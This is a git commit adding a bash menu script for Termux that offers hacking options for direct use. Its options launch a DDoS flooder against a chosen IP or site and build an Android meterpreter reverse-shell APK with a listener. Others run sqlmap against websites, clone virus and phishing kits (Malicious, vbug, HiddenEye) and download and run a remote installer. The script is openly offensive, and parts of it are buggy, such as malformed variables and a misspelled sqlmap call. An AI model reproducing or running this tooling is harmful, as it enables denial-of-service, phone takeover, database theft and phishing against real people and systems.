77531f919ac33970a30b6073e860e416a0cde43a
palestini <47440499+palestini@users.noreply.github.com>
2019-02-25 23:01:32 +0200

    Add files via upload

---
+++ Mo.sh
@@ -0,0 +1,442 @@
+#!/bin/bash
+clear
+red='\e[1;31m'
+green='\e[1;32m'
+blue='\e[1;34m'
+purple='\e[1;35m'
+cyan='\e[1;36m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+echo ""
+sleep 1
+echo -e $white '░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  '
+echo ""
+echo -e $red '     ░█░█░█▀█░█▀▀░█░█░░░░░█░█░█▀█░█░█░█▀▄░█▀▀░█▀▀░█░░░█▀▀'
+echo -e $red '     ░█▀█░█▀█░█░░░█▀▄░▄▄▄░░█░░█░█░█░█░█▀▄░▀▀█░█▀▀░█░░░█▀▀'
+echo -e $white'      ░▀░▀░▀░▀░▀▀▀░▀░▀░░░░░░▀░░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░░'
+echo ""
+echo -e $white   '      ---------------------->' $red'[Telegram @Ho2001]'
+echo -e $white   '      ---------------------->' $red' [Hossam Ashraf]'
+echo -e $red       '      ---------------------->' $white'  <---------->'
+echo ""
+echo -e $white '░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  '
+echo ""
+echo -e $white  '      >>>    '$red'<--{TE..........RM..........UX}-->' $white '   <<<'
+echo -e $white  '            >>>   '$red'<--{ HacK YourSelF }-->' $white '  <<<'
+echo ""
+echo -e $yellow 'command'
+echo ""
+sleep 1
+echo -e $red ' 01:' $green 'Ddos AttacK' 
+sleep 1
+echo -e $red ' 02:' $green 'Hack Android '
+sleep 1
+echo -e $red ' 03:' $green 'Hack SQL '
+sleep 1
+echo -e $red ' 04:' $green 'Virus '
+sleep 1
+echo -e $red ' 05:' $green 'HiddeEye_DarkFly '
+sleep 1
+echo -e $red ' 06:' $green 'Nmap '
+sleep 1
+echo -e $red ' 07:' $green 'Hack yourself '
+sleep 1
+echo -e $red ' 08:' $green 'Hack yourself '
+sleep 1
+echo -e $red ' 09:' $green 'Hack yourself '
+sleep 1
+echo -e $red ' 10:' $green 'Hack yourself '
+sleep 1
+echo -e $red ' 11:' $green 'Hack yourself '
+sleep 1
+echo -e $red ' 12:' $green 'Hack yourself '
+sleep 1
+echo -e $red ' 13:' $green 'Hack yourself '
+sleep 1
+echo -e $red ' 14:' $green 'Hack yourself '
+sleep 1
+echo -e $red ' 15:' $green 'Install MetaSploit && NetHunter '
+echo ""
+sleep 1
+echo -e $red  ' 00:' $green ' Exit --00- '
+echo -e $yellow
+sleep 1
+read -p "Enter the number >>> " u
+echo ""
+if [ $u -eq 1 ]
+then
+clear
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $white'      ░█░█░█▀█░█▀▀░█▀▀░█▀█░█▄█'
+echo -e $white'      ░█▀█░█░█░▀▀█░▀▀█░█▀█░█░█'
+echo -e $green'      ░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀░▀'
+echo ""
+echo -e $green   '      ---------------------->' $white'[Telegram @Ho2001]'
+echo -e $green   '      ---------------------->' $white' [Hossam Ashraf]'
+echo -e $white   '      ---------------------->' $green'  <---------->'
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $green  '      >>>    '$white'<--{TE..........RM..........UX}-->' $green '   <<<'
+echo -e $green  '               >>>'$white' <--{ Ddos AttacK }-->' $green '<<<'
+echo ""
+echo ""
+echo ""
+echo ""
+echo -e $red '1: ' $white '--Ddos WebSite' 
+echo -e $red '2: ' $white '--Ddos Android' 
+echo -e $red '0: ' $white '--Back'
+echo ""
+echo -e $yellow
+read -p "Enter the number >>> " H
+echo ""
+if [ $H -eq 1 ]
+then
+echo -e $green '     ^_^  Ddos WebSite  ^_^'
+echo -e $red 
+git clone https://github.com/cyweb/hammer.git
+cd hammer
+chmod +x *
+clear
+python hammer.py
+echo ""
+echo -e $red "Please Insert ip or link"
+echo -e $white
+read -p "insert ip or link >>> " ip or link
+python3 hammer.py -s $ip or link -p80 -t135
+fi
+if [ $H -eq 2 ]
+then
+
+echo -e $green '      ^_^ Ddos Android ^_^ '
+echo -e $red 
+read -p 'insert the ip >>>  ' ip
+ping $ip
+fi
+if [ $H -eq 0 ]
+then 
+clear
+bash Mo.sh
+fi
+fi
+if [ $u -eq 2 ]
+then
+clear
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $white'      ░█░█░█▀█░█▀▀░█▀▀░█▀█░█▄█'
+echo -e $white'      ░█▀█░█░█░▀▀█░▀▀█░█▀█░█░█'
+echo -e $green'      ░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀░▀'
+echo ""
+echo -e $green   '      ---------------------->' $white'[Telegram @Ho2001]'
+echo -e $green   '      ---------------------->' $white' [Hossam Ashraf]'
+echo -e $white   '      ---------------------->' $green'  <---------->'
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $green  '      >>>    '$white'<--{TE..........RM..........UX}-->' $green '   <<<'
+echo -e $green  '              >>>'$white' <--{ Hack Android }-->' $green '<<<'
+echo ""
+echo ""
+echo ""
+echo -e $red '1: ' $white '--payload .apk ' 
+echo -e $red '2: ' $white '--open metasploit '
+echo -e $red '0: ' $white '--Back '
+echo ""
+echo -e $yellow
+read -p "Enter the number >>> " M
+echo ""
+if [ $M -eq 1 ] 
+then
+echo -e $red " please insert LHOST "
+read -p "insert LHOST >>>" lhost
+echo -e $red " please insert port "
+read -p "insert port >>>" lport
+echo -e $red " please insert Name payload "
+read -p "insert name >>>" name
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /sdcard/$name.apk
+echo -e $green '--------------->sdcard' 
+echo -e $red '0: ' $white '--Back '
+echo -e $yellow
+read -p "Enter the number >>> " Ho
+echo ""
+if [ $Ho -eq 0 ]
+then 
+clear
+bash Mo.sh
+fi
+fi
+if [ $M -eq 2 ] 
+then
+echo -e $red "Please Insert LHOST"
+read -p "insert LHOST >>> " host
+echo -e $red "Please Insert PORT"
+read -p "insert LHOST >>> " port
+msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT
+'$port -x 'exploit'
+fi
+if [ $M -eq 0 ]
+then 
+clear
+bash Mo.sh
+fi
+fi
+if [ $u -eq 3 ]
+then
+clear
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $white'      ░█░█░█▀█░█▀▀░█▀▀░█▀█░█▄█'
+echo -e $white'      ░█▀█░█░█░▀▀█░▀▀█░█▀█░█░█'
+echo -e $green'      ░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀░▀'
+echo ""
+echo -e $green   '      ---------------------->' $white'[Telegram @Ho2001]'
+echo -e $green   '      ---------------------->' $white' [Hossam Ashraf]'
+echo -e $white   '      ---------------------->' $green'  <---------->'
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $green  '      >>>    '$white'<--{TE..........RM..........UX}-->' $green '   <<<'
+echo -e $green  '                >>>'$white' <--{ Hack SQL }-->' $green '<<<'
+echo ""
+echo ""
+echo ""
+echo -e $red '1: ' $white '--optiva-Framework ' 
+echo -e $red '2: ' $white '--sqlmap '
+echo -e $red '0: ' $white '--Back '
+echo ""
+echo -e $yellow
+read -p "Enter the number >>> " R
+echo ""
+if [ $R -eq 1 ] 
+then
+echo -e $red
+git clone https://github.com/joker25000/Optiva-Framework
+cd Optiva-Framework
+bash installer.sh
+python2 optiva.py
+help
+fi
+if [ $R -eq 2 ] 
+then
+echo -e $red
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+chmod +x *
+clear
+python2 sqlmap
+echo -e $red "Please Insert website sql"
+read -p "insert website sql >>> " sql
+python sqlmap.py -u $sql --dbs 
+python sqlamp.py -u $sql 
+python sqlmap.py -u $sql
+python sqlmap.py -u $sql
+fi
+if [ $R -eq 0 ]
+then 
+clear
+bash Mo.sh
+fi
+fi
+if [ $u -eq 4 ]
+then
+clear
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $white'      ░█░█░█▀█░█▀▀░█▀▀░█▀█░█▄█'
+echo -e $white'      ░█▀█░█░█░▀▀█░▀▀█░█▀█░█░█'
+echo -e $green'      ░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀░▀'
+echo ""
+echo -e $green   '      ---------------------->' $white'[Telegram @Ho2001]'
+echo -e $green   '      ---------------------->' $white' [Hossam Ashraf]'
+echo -e $white   '      ---------------------->' $green'  <---------->'
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $green  '      >>>    '$white'<--{TE..........RM..........UX}-->' $green '   <<<'
+echo -e $green  '              >>>'$white' <--{ Virus }-->' $green '<<<'
+echo ""
+echo ""
+echo ""
+echo -e $red '1: ' $white'--Virus maliciuos '
+echo -e $red '2: ' $white'--install vbug  '
+echo -e $red '0: ' $white'--Back '
+echo ""
+echo -e $yellow
+read -p "Enter the number >>> " d
+echo ""
+if [ $d -eq 1 ]
+then 
+git clone https://github.com/Hider5/Malicious.git
+pip install -r requirements.txt
+python2 malicious.py
+fi
+if [ $d -eq 2 ] 
+then 
+git clone https://github.com/Junior60/vbug.git
+cd vbug
+chmod +x vbug.py
+python2 vbug.py
+fi
+if [ $d -eq 0 ]
+then
+bash Mo.sh
+fi
+fi
+if [ $u -eq 5 ]
+then
+clear
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $white'      ░█░█░█▀█░█▀▀░█▀▀░█▀█░█▄█'
+echo -e $white'      ░█▀█░█░█░▀▀█░▀▀█░█▀█░█░█'
+echo -e $green'      ░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀░▀'
+echo ""
+echo -e $green   '      ---------------------->' $white'[Telegram @Ho2001]'
+echo -e $green   '      ---------------------->' $white' [Hossam Ashraf]'
+echo -e $white   '      ---------------------->' $green'  <---------->'
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $green  '      >>>    '$white'<--{TE..........RM..........UX}-->' $green '   <<<'
+echo -e $green  '             >>>'$white' <--{ HiddeEye_DarkFly}-->' $green '<<<'
+echo ""
+echo ""
+echo ""
+echo -e $red '1: ' $white'--HiddeEye_Termux '
+echo -e $red '2: ' $white'--DarkFly-Tool '
+echo -e $red '0: ' $white'--Back '
+echo ""
+echo -e $yellow
+read -p "Enter the number >>> " k
+if [ $k -eq 1 ]
+then
+pkg install git wget python2 python php perl ruby proot
+git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEye.git
+cd HiddenEye
+pip3.7 install -r and python3.7 HiddenEye.py
+fi
+if [ $k -eq 2 ]
+then
+ifconfig
+fi
+if [ $k -eq 0 ]
+then
+clear
+bash Mo.sh
+fi
+fi
+#---------
+if [ $u -eq 6 ] 
+then
+clear
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $white'      ░█░█░█▀█░█▀▀░█▀▀░█▀█░█▄█'
+echo -e $white'      ░█▀█░█░█░▀▀█░▀▀█░█▀█░█░█'
+echo -e $green'      ░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀░▀'
+echo ""
+echo -e $green   '      ---------------------->' $white'[Telegram @Ho2001]'
+echo -e $green   '      ---------------------->' $white' [Hossam Ashraf]'
+echo -e $white   '      ---------------------->' $green'  <---------->'
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $green  '      >>>    '$white'<--{TE..........RM..........UX}-->' $green '   <<<'
+echo -e $green  '                   >>>'$white' <--{ NMAP }-->' $green '<<<'
+echo ""
+echo ""
+echo -e $red '1: ' $white'--Nmap ip '
+echo -e $red '2: ' $white'--IPGeoLocation '
+echo -e $red '0: ' $white'--Back '
+echo ""
+echo -e $yellow
+read -p "Enter the number >>> " k
+if [ $k -eq 1 ] 
+then
+pkg install nmap
+echo -e $yellow
+read -p "{+}-Insert ip >>> " Q
+nmap $Q
+fi
+if [ $k -eq 2 ] 
+then
+git clone https://github.com/maldevel/IPGeoLocation
+ cd IPGeoLocation
+pip install -r requirements.txt 
+echo -e $yellow
+read -p "{+}-Insert ip >>> " G
+python3 ipgeolocation.py -t $G
+fi
+if [ $k -eq 0 ]
+then 
+clear
+bash Mo.sh
+fi
+fi
+#---------
+if [ $u -eq 15 ]
+then
+clear
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $white'      ░█░█░█▀█░█▀▀░█▀▀░█▀█░█▄█'
+echo -e $white'      ░█▀█░█░█░▀▀█░▀▀█░█▀█░█░█'
+echo -e $green'      ░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀░▀'
+echo ""
+echo -e $green   '      ---------------------->' $white'[Telegram @Ho2001]'
+echo -e $green   '      ---------------------->' $white' [Hossam Ashraf]'
+echo -e $white   '      ---------------------->' $green'  <---------->'
+echo ""
+echo -e $green '[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]'
+echo ""
+echo -e $green  '      >>>    '$white'<--{TE..........RM..........UX}-->' $green '   <<<'
+echo -e $green  '          >>>'$white' <--{ install Meta && NetHu }-->' $green '<<<'
+echo ""
+echo ""
+echo -e $red '1: ' $white'--install MetaSploit '
+echo -e $red '2: ' $white'--install NetHunter '
+echo -e $red '0: ' $white'--Back '
+echo ""
+echo -e $yellow
+read -p "Enter the number >>> " n
+echo ""
+if [ $n -eq 1 ]
+then
+ifconfig
+fi
+if [ $n -eq 2 ]
+then 
+echo -e $red
+apt update && apt upgrade
+cd $HOME 
+echo -e $green
+curl -LO https://raw.githubusercontent.com/Hax4us/Nethunter-In-Termux/master/kalinethunter 
+chmod +x kalinethunter
+./kalinethunter
+echo -e $yellow
+startkali
+wget https://http.kali.org/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2018.1_all.deb
+echo -e $cyan
+apt install ./kali-archive-keyring_2018.1_all.deb
+fi
+if [ $n -eq 0 ]
+then 
+clear
+bash Mo.sh
+fi
+fi
+if [ $u -eq 00 ] 
+then 
+echo -e $red 
+clear
+figlet -f smslant.flf "Good bye"
+fi
